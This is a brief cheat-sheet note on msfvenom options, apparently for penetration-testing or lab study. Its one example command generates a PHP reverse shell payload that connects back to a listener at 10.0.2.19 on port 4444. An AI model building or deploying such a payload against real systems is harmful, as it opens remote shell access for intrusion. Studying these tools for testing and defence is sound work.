### Options
- `--list formats` shows formats of payloads (ex. `.exe`, `.py`, etc.)
- `-e` encodes payload (ex. `php/base64`)
- `-p` payload to use
### Examples
###### PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=4444 -f raw > reverse_shell.php
```